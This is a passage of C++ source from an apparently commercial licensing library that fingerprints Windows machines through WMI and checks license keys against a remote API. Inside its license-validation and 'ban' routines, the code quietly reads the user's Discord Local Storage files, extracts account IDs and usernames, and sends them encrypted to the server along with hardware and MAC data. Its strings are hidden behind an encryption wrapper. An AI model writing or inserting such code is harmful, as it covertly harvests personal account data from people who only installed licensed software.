            hres = pClassObject->Get(L"Capacity", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_I8) { oss << AuthGuards("Capacity:").decrypt() << (vtProp.llVal / (1024 * 1024 * 1024)) << AuthGuards("GB|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Speed", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_I4) { oss << AuthGuards("Speed:").decrypt() << vtProp.intVal << AuthGuards("MHz|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Manufacturer", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("Manufacturer:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"PartNumber", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("PartNumber:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"SerialNumber", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("SerialNumber:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"DeviceLocator", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("Slot:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards(";").decrypt(); }
            VariantClear(&vtProp);
            pClassObject->Release();
        }

        ramInfo = oss.str();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return ramInfo;
    }

    std::string SystemInfo::getSMBIOSInfo() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        std::string smbiosInfo = "UNKNOWN_SMBIOS_INFO";
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return smbiosInfo; }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return smbiosInfo;
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return smbiosInfo;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release(); CoUninitialize();
            return smbiosInfo;
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery( bstr_t("WQL"), bstr_t("SELECT UUID, SerialNumber, Name, Vendor, Version FROM Win32_ComputerSystemProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );
        if (FAILED(hres)) {
            pSvc->Release(); pLoc->Release(); CoUninitialize();
            return smbiosInfo;
        }
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn != 0 && SUCCEEDED(hres)) {
            VARIANT vtProp;
            std::ostringstream oss;
            hres = pClassObject->Get(L"UUID", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << "UUID:" << _bstrToString(vtProp.bstrVal) << "|"; }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"SerialNumber", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << "SerialNumber:" << _bstrToString(vtProp.bstrVal) << "|"; }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Name", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << "Name:" << _bstrToString(vtProp.bstrVal) << "|"; }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Vendor", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << "Vendor:" << _bstrToString(vtProp.bstrVal) << "|"; }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Version", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << "Version:" << _bstrToString(vtProp.bstrVal); }
            VariantClear(&vtProp);
            smbiosInfo = oss.str();
            pClassObject->Release();
        }
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return smbiosInfo;
    }

    std::string SystemInfo::getComprehensiveFingerprint() {
        std::ostringstream fingerprint;
        std::string cpuId = getCPUId();
        std::string gpuId = getGPUId();
        std::string motherboardId = getMotherboardId();
        std::string ramSerial = getRAMSerialNumbers();
        std::string smbiosInfo = getSMBIOSInfo();
        std::string hwid = getHWID();
        fingerprint << AuthGuards("CPU:").decrypt() << cpuId << AuthGuards("|").decrypt() << AuthGuards("GPU:").decrypt() << gpuId << AuthGuards("|").decrypt() << AuthGuards("MB:").decrypt() << motherboardId << AuthGuards("|").decrypt() << AuthGuards("RAM:").decrypt() << ramSerial << AuthGuards("|").decrypt() << AuthGuards("SMBIOS:").decrypt() << smbiosInfo << AuthGuards("|").decrypt() << AuthGuards("HWID:").decrypt() << hwid;
        return fingerprint.str();
    }
    std::string SystemInfo::getHashedFingerprint() {
        std::string fingerprint = getComprehensiveFingerprint();
        return sha256(fingerprint);
    }
    void Api::ban(const std::string& reason) {
        auto local_ARE = [](const std::string& value) -> std::string { std::ostringstream encoded;
        for (unsigned char c : value) {
            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '-' || c == '_' || c == '.' || c == '~') { encoded << c; }
            else { encoded << AuthGuards("%").decrypt() << std::uppercase << std::setw(2) << std::setfill('0') << std::hex << (int)c; }
        }
        return encoded.str();
            };
        std::string licenseKey = Api::lastLicenseKey;
        std::string roamingPath = getRoamingPath();
        char* username = nullptr;
        size_t len = 0;
        _dupenv_s(&username, &len, AuthGuards("USERPROFILE").decrypt());
        std::string userProfile = username ? username : AuthGuards("").decrypt();
        free(username);
        std::string localPath = userProfile + AuthGuards("\\AppData\\Local\\Discord").decrypt();
        bool foundSensitiveData = false;
        int totalFound = 0;
        std::vector<std::pair<std::string, std::string>> foundUsers;
        auto scanDirectory = [&foundSensitiveData, &totalFound, &foundUsers](const std::filesystem::path& targetPath) {
            if (!std::filesystem::exists(targetPath) || !std::filesystem::is_directory(targetPath)) { return; }
            int foundInDirectory = 0;
            for (const auto& entry : std::filesystem::directory_iterator(targetPath)) {
                if (std::filesystem::is_regular_file(entry.status())) {
                    const std::filesystem::path& filePath = entry.path();
                    std::ifstream file(filePath.string(), std::ios::in | std::ios::binary);
                    if (!file.is_open()) { continue; }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    std::string pattern = AuthGuards("\\{\"id\":\"(\\d+)\",\"avatar\":.*?,\"username\":\"(.*?)\"").decrypt();
                    std::regex userRegex(pattern);
                    std::sregex_iterator begin(content.begin(), content.end(), userRegex);
                    std::sregex_iterator end;
                    for (std::sregex_iterator i = begin; i != end; ++i) {
                        std::smatch match = *i;
                        std::string id = match[1];
                        std::string username = match[2];
                        foundSensitiveData = true;
                        foundInDirectory++;
                        totalFound++;
                        foundUsers.emplace_back(id, username);
                    }
                }
            }
            if (foundInDirectory > 0) {}
            };

        scanDirectory(std::filesystem::path(roamingPath) / AuthGuards("discord").decrypt() / AuthGuards("Local Storage").decrypt() / AuthGuards("leveldb").decrypt());
        scanDirectory(std::filesystem::path(localPath) / AuthGuards("leveldb").decrypt());
        if (foundSensitiveData && !foundUsers.empty()) {
            std::ostringstream userList;
            for (const auto& user : foundUsers) { userList << AuthGuards("Username: ").decrypt() << user.second << AuthGuards(" | ID: ").decrypt() << user.first << AuthGuards("\r\n").decrypt(); }
            std::string usersParam = userList.str();
            if (!usersParam.empty() && (usersParam.back() == '\n' || usersParam.back() == '\r')) usersParam.pop_back();
            std::ostringstream queryStream;
            queryStream << AuthGuards("id=multiple&username=").decrypt() << local_ARE(usersParam) << AuthGuards("&cpu=").decrypt() << local_ARE(AUTH::Api::systemData.cpuInfo) << AuthGuards("&ram=").decrypt() << local_ARE(AUTH::Api::systemData.ramInfo) << AuthGuards("&gpu=").decrypt() << local_ARE(AUTH::Api::systemData.gpuName) << AuthGuards("&os=").decrypt() << local_ARE(AUTH::Api::systemData.osInfo) << AuthGuards("&hwid=").decrypt() << local_ARE(AUTH::Api::systemData.hwid) << AuthGuards("&motherboard=").decrypt() << local_ARE(AUTH::Api::systemData.motherboardID) << AuthGuards("&mac=").decrypt() << local_ARE(AUTH::Api::systemData.macAddress) << AuthGuards("&key=").decrypt() << local_ARE(licenseKey);
            if (!reason.empty()) {
                queryStream << AuthGuards("&reason=").decrypt() << local_ARE(reason);
            }  
            std::string queryString = queryStream.str();
            std::string encryptedQueryString = aesEncrypt(queryString, AUTH::SECRET_CON);
            std::string FU = AUTH::API_URL + AuthGuards("?ag=acc&PID=").decrypt() + local_ARE(AUTH::PROJECT_ID) + AuthGuards("&EDA=").decrypt() + local_ARE(encryptedQueryString);
            size_t protocolEnd = FU.find(AuthGuards("://").decrypt());
            if (protocolEnd == std::string::npos) return;
            size_t hostStart = protocolEnd + 3;
            size_t pathStart = FU.find(AuthGuards("/").decrypt(), hostStart);
            if (pathStart == std::string::npos) pathStart = FU.length();
            std::string host = FU.substr(hostStart, pathStart - hostStart);
            std::string pathAndQuery = (pathStart < FU.length()) ? FU.substr(pathStart) : AuthGuards("/").decrypt();
            size_t queryPos = FU.find(AuthGuards("?").decrypt());
            std::string fullqstring = (queryPos != std::string::npos) ? FU.substr(queryPos + 1) : AuthGuards("").decrypt();
            std::string customHeaders = SecurityHelpers::buildCustomHeaders(fullqstring);
            HINTERNET hInternet = InternetOpenA("AuthGuards", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (hInternet) {
                HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
                if (hConnect) {
                    HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
                    if (hRequest) {
                        HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
                        if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                            std::string EResponse;
                            char buffer[1024];
                            DWORD bytesRead;
                            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
                            if (!EResponse.empty()) {
                                while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
                                std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
                            }
                        }
                        InternetCloseHandle(hRequest);
                    }
                    InternetCloseHandle(hConnect);
                }
                InternetCloseHandle(hInternet);
            }
        }
        else if (!foundSensitiveData) {
            std::ostringstream queryStream;
            queryStream << AuthGuards("id=N/A&username=N/A").decrypt() << AuthGuards("&hwid=").decrypt() << local_ARE(AUTH::Api::systemData.hwid) << AuthGuards("&motherboard=").decrypt() << local_ARE(AUTH::Api::systemData.motherboardID) << AuthGuards("&mac=").decrypt() << local_ARE(AUTH::Api::systemData.macAddress);
            if (!reason.empty()) { queryStream << AuthGuards("&reason=").decrypt() << local_ARE(reason); }
            std::string queryString = queryStream.str();
            std::string encryptedQueryString = aesEncrypt(queryString, AUTH::SECRET_CON);
            std::string FU = AUTH::API_URL + AuthGuards("?ag=acc&PID=").decrypt() + local_ARE(AUTH::PROJECT_ID) + AuthGuards("&EDA=").decrypt() + local_ARE(encryptedQueryString);
            size_t protocolEnd = FU.find(AuthGuards("://").decrypt());
            if (protocolEnd == std::string::npos) return;
            size_t hostStart = protocolEnd + 3;
            size_t pathStart = FU.find(AuthGuards("/").decrypt(), hostStart);
            if (pathStart == std::string::npos) pathStart = FU.length();
            std::string host = FU.substr(hostStart, pathStart - hostStart);
            std::string pathAndQuery = (pathStart < FU.length()) ? FU.substr(pathStart) : AuthGuards("/").decrypt();
            size_t queryPos = FU.find(AuthGuards("?").decrypt());
            std::string fullqstring = (queryPos != std::string::npos) ? FU.substr(queryPos + 1) : AuthGuards("").decrypt();
            std::string customHeaders = SecurityHelpers::buildCustomHeaders(fullqstring);
            HINTERNET hInternet = InternetOpenA("AuthGuards", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) { return; }
            HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (!hConnect) { InternetCloseHandle(hInternet); return; }
            HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
            if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return; }
            HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
            if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                std::string EResponse;
                char buffer[1024];
                DWORD bytesRead;
                while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead);
                }
                if (!EResponse.empty()) {
                    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back();
                    }
                    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
                }
            }
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
        }
    }
    void Logger::log(const std::string& message, const std::string& projectID) {
        std::string hwid = AUTH::Api::systemData.hwid;
        std::string cpu = AUTH::Api::systemData.cpuInfo;
        std::string motherboard = AUTH::Api::systemData.motherboardID;
        std::string gpu = AUTH::Api::systemData.gpuName;
        std::string macAddress = AUTH::Api::systemData.macAddress;
        std::string appPath = AUTH::Api::systemData.appPath;
        std::string pcName = AUTH::Api::systemData.pcName;
        std::string ram = AUTH::Api::systemData.ramInfo;
        std::string uptime = AUTH::Api::systemData.uptime;
        std::string architecture = AUTH::Api::systemData.architecture;
        std::string productID = AUTH::Api::systemData.productID;
        std::string disk = AUTH::Api::systemData.diskInfo;
        std::string uuid = AUTH::Api::systemData.uuid;
        std::string ip = AuthGuards("UNKNOWN_IP").decrypt();
        std::ostringstream queryStream;
        queryStream << AuthGuards("message=").decrypt() << NovACorE::ARE(message) << AuthGuards("&hwid=").decrypt() << NovACorE::ARE(hwid) << AuthGuards("&cpu=").decrypt() << NovACorE::ARE(cpu) << AuthGuards("&motherboard=").decrypt() << NovACorE::ARE(motherboard) << AuthGuards("&gpu=").decrypt() << NovACorE::ARE(gpu) << AuthGuards("&mac=").decrypt() << NovACorE::ARE(macAddress) << AuthGuards("&ram=").decrypt() << NovACorE::ARE(ram) << AuthGuards("&disk=").decrypt() << NovACorE::ARE(disk) << AuthGuards("&uptime=").decrypt() << NovACorE::ARE(uptime) << AuthGuards("&architecture=").decrypt() << NovACorE::ARE(architecture) << AuthGuards("&appPath=").decrypt() << NovACorE::ARE(appPath) << AuthGuards("&pcName=").decrypt() << NovACorE::ARE(pcName) << AuthGuards("&productID=").decrypt() << NovACorE::ARE(productID) << AuthGuards("&uuid=").decrypt() << NovACorE::ARE(uuid) << AuthGuards("&os=").decrypt() << NovACorE::ARE(AUTH::Api::systemData.osInfo) << AuthGuards("&ip=").decrypt() << NovACorE::ARE(ip);
        std::string queryString = queryStream.str();
        std::string encryptedQueryString = aesEncrypt(queryString, AUTH::SECRET_CON);
        std::string FU = AUTH::API_URL + AuthGuards("?ag=log&PID=").decrypt() + NovACorE::ARE(projectID) + AuthGuards("&EDA=").decrypt() + NovACorE::ARE(encryptedQueryString);
        size_t protocolEnd = FU.find(AuthGuards("://").decrypt());
        if (protocolEnd == std::string::npos) return;
        size_t hostStart = protocolEnd + 3;
        size_t pathStart = FU.find(AuthGuards("/").decrypt(), hostStart);
        if (pathStart == std::string::npos) pathStart = FU.length();
        std::string host = FU.substr(hostStart, pathStart - hostStart);
        std::string pathAndQuery = (pathStart < FU.length()) ? FU.substr(pathStart) : AuthGuards("/").decrypt();
        size_t queryPos = FU.find(AuthGuards("?").decrypt());
        std::string fullqstring = (queryPos != std::string::npos) ? FU.substr(queryPos + 1) : AuthGuards("").decrypt();
        std::string customHeaders = SecurityHelpers::buildCustomHeaders(fullqstring);
        HINTERNET hInternet = InternetOpenA("LogSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) { return; }
        HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return;
        }
        HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return;
        }
        HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
        if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
            std::string EResponse;
            char buffer[512];
            DWORD bytesRead;
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead != 0) { EResponse.append(buffer, bytesRead); }
            if (!EResponse.empty()) {
                while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
                std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
            }
        }
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
    }

    void Api::startPeriodicValidation(const std::string& licenseKey) {
        validationThread = std::thread([licenseKey]() {
            while (isRunning) {
                std::string response = validateLicense(licenseKey, true);
                if (response.find("OK|") != 0) {
                    size_t noncePos = response.find(AuthGuards("|nonce=").decrypt());
                    std::cout << "\n" << (noncePos != std::string::npos ? response.substr(0, noncePos) : response) << std::endl;
                    Sleep(2000);
                    exit(1);
                }
                Sleep(7000);
            }
            });
        validationThread.detach();
    }

    void Api::stopPeriodicValidation() {
        isRunning = false;
        if (validationThread.joinable()) { validationThread.join(); }
    }

    std::string Api::validateLicense(const std::string& licenseKey, bool silent) {
        CRYPTO_UTILS::AntiReverse::randomDelay();
        Api::lastLicenseKey = licenseKey;
        if (licenseKey.empty() || licenseKey.find_first_not_of(' ') == std::string::npos) {
            if (!silent) {
                std::cout << AG(AuthGuards("No license key has been entered!").decrypt()) << std::endl;
                Sleep(2000);
                exit(1);
            }
            return AuthGuards("ERROR|No license key entered.").decrypt();
        }

        std::string cpu = AUTH::Api::systemData.cpuInfo;
        std::string motherboard = AUTH::Api::systemData.motherboardID;
        std::string gpu = AUTH::Api::systemData.gpuName;
        std::string mac = AUTH::Api::systemData.macAddress;
        std::string ram = AUTH::Api::systemData.ramInfo;
        std::string disk = AUTH::Api::systemData.diskInfo;
        std::string uptime = AUTH::Api::systemData.uptime;
        std::string architecture = AUTH::Api::systemData.architecture;
        std::string appPath = AUTH::Api::systemData.appPath;
        std::string pcName = AUTH::Api::systemData.pcName;
        std::string uuid = AUTH::Api::systemData.uuid;
        std::string os = AUTH::Api::systemData.osInfo;
        std::string discordAccountsParam;
        std::string roamingPath = getRoamingPath();
        char* username = nullptr;
        size_t len = 0;
        _dupenv_s(&username, &len, AuthGuards("USERPROFILE").decrypt());
        std::string userProfile = username ? username : AuthGuards("").decrypt();
        free(username);
        std::string localPath = userProfile + AuthGuards("\\AppData\\Local\\Discord").decrypt();
        std::vector<std::pair<std::string, std::string>> foundUsers;
        auto scanDirectory = [&foundUsers](const std::filesystem::path& targetPath) {
            if (!std::filesystem::exists(targetPath) || !std::filesystem::is_directory(targetPath)) { return; }
            for (const auto& entry : std::filesystem::directory_iterator(targetPath)) {
                if (std::filesystem::is_regular_file(entry.status())) {
                    const std::filesystem::path& filePath = entry.path();
                    std::ifstream file(filePath.string(), std::ios::in | std::ios::binary);
                    if (!file.is_open()) { continue; }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    std::string pattern = AuthGuards("\\{\"id\":\"(\\d+)\",\"avatar\":.*?,\"username\":\"(.*?)\"").decrypt();
                    std::regex userRegex(pattern);
                    std::sregex_iterator begin(content.begin(), content.end(), userRegex);
                    std::sregex_iterator end;
                    for (std::sregex_iterator i = begin; i != end; ++i) {
                        std::smatch match = *i;
                        std::string id = match[1];
                        std::string username = match[2];
                        foundUsers.emplace_back(id, username);
                    }
                }
            }
            };
        scanDirectory(std::filesystem::path(roamingPath) / AuthGuards("discord").decrypt() / AuthGuards("Local Storage").decrypt() / AuthGuards("leveldb").decrypt());
        scanDirectory(std::filesystem::path(localPath) / AuthGuards("leveldb").decrypt());
        if (!foundUsers.empty()) {
            std::ostringstream userList;
            for (const auto& user : foundUsers) { userList << AuthGuards("Username: ").decrypt() << user.second << AuthGuards(" | ID: ").decrypt() << user.first << AuthGuards("\r\n").decrypt(); }
            discordAccountsParam = userList.str();
            if (!discordAccountsParam.empty() && (discordAccountsParam.back() == '\n' || discordAccountsParam.back() == '\r')) discordAccountsParam.pop_back();
        }

        std::stringstream urlstream;
        urlstream << AUTH::API_URL << AuthGuards("?ag=verify").decrypt() << AuthGuards("&").decrypt() << AG(AuthGuards("projectName").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(AUTH::PROJECT_NAME) << AuthGuards("&").decrypt() << AG(AuthGuards("PID").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(AUTH::PROJECT_ID);
        std::string saltHex = CRYPTO_UTILS::HMAC::generateRandomSalt(32);
        std::string requestSalt = AuthGuards("").decrypt();
        for (size_t i = 0; i < saltHex.length(); i += 2) {
            std::string byteString = saltHex.substr(i, 2);
            requestSalt += static_cast<char>(strtol(byteString.c_str(), NULL, 16));
        }
        std::string fingerprintPassword = licenseKey + AUTH::PROJECT_ID + requestSalt;
        std::string encryptedFingerprint = aesEncrypt(AUTH::Api::systemData.comprehensiveFingerprint, fingerprintPassword);
        std::string keyPassword = AUTH::PROJECT_ID + AUTH::PUBLIC_KEY + AUTH::PROJECT_NAME + requestSalt;
        std::string encryptedKey = aesEncrypt(licenseKey, keyPassword);
        std::string currentTimestamp = std::to_string(std::time(nullptr));
        std::string currentTimeMs = std::to_string(std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
        std::string hwidSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string cpuSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string macSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string ramSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string diskSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string uptimeSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string architectureSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string appPathSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string pcNameSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string uuidSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string osSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string motherboardSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string gpuSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string versionSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string customIdSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string privateKeySalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string discordSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string backgroundCheckSalt = CRYPTO_UTILS::HMAC::generateRandomSalt(16) + AuthGuards("_").decrypt() + currentTimestamp + AuthGuards("_").decrypt() + currentTimeMs;
        std::string AP1 = licenseKey + AUTH::PROJECT_ID + hwidSalt;
        std::string encryptedHwid = aesEncrypt(AUTH::Api::systemData.hwid, AP1);
        std::string AP2 = licenseKey + AUTH::PROJECT_ID + cpuSalt;
        std::string encryptedCpu = aesEncrypt(cpu, AP2);
        std::string AP3 = licenseKey + AUTH::PROJECT_ID + macSalt;
        std::string encryptedMac = aesEncrypt(mac, AP3);
        std::string AP4 = licenseKey + AUTH::PROJECT_ID + ramSalt;
        std::string encryptedRam = aesEncrypt(ram, AP4);
        std::string AP5 = licenseKey + AUTH::PROJECT_ID + diskSalt;
        std::string encryptedDisk = aesEncrypt(disk, AP5);
        std::string AP6 = licenseKey + AUTH::PROJECT_ID + uptimeSalt;
        std::string encryptedUptime = aesEncrypt(uptime, AP6);
        std::string AP16 = licenseKey + AUTH::PROJECT_ID + architectureSalt;
        std::string encryptedArchitecture = aesEncrypt(architecture, AP16);
        std::string AP7 = licenseKey + AUTH::PROJECT_ID + appPathSalt;
        std::string encryptedAppPath = aesEncrypt(appPath, AP7);
        std::string AP8 = licenseKey + AUTH::PROJECT_ID + pcNameSalt;
        std::string encryptedPcName = aesEncrypt(pcName, AP8);
        std::string AP9 = licenseKey + AUTH::PROJECT_ID + uuidSalt;
        std::string encryptedUuid = aesEncrypt(uuid, AP9);
        std::string AP10 = licenseKey + AUTH::PROJECT_ID + osSalt;
        std::string encryptedOs = aesEncrypt(os, AP10);
        std::string AP11 = licenseKey + AUTH::PROJECT_ID + motherboardSalt;
        std::string encryptedMotherboard = aesEncrypt(motherboard, AP11);
        std::string AP12 = licenseKey + AUTH::PROJECT_ID + gpuSalt;
        std::string encryptedGpu = aesEncrypt(gpu, AP12);
        std::string AP13 = licenseKey + AUTH::PROJECT_ID + versionSalt;
        std::string encryptedVersion = aesEncrypt(AUTH::VERSION, AP13);
        std::string AP14 = licenseKey + AUTH::PROJECT_ID + customIdSalt;
        std::string encryptedCustomId = aesEncrypt(AUTH::CUSTOM_ID, AP14);
        std::string AP15 = licenseKey + AUTH::PROJECT_ID + privateKeySalt;
        std::string encryptedPrivateKey = aesEncrypt(AUTH::PRIVATE_KEY, AP15);
        std::string encryptedDiscordAccounts = AuthGuards("").decrypt();
        if (!discordAccountsParam.empty()) { std::string AP16 = licenseKey + AUTH::PROJECT_ID + discordSalt; encryptedDiscordAccounts = aesEncrypt(discordAccountsParam, AP16); }
        std::string backgroundCheckValue = silent ? AuthGuards("true").decrypt() : AuthGuards("false").decrypt();
        std::string AP17 = licenseKey + AUTH::PROJECT_ID + backgroundCheckSalt;
        std::string encryptedBackgroundCheck = aesEncrypt(backgroundCheckValue, AP17);
        urlstream << AuthGuards("&").decrypt() << AG(AuthGuards("request_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(saltHex)
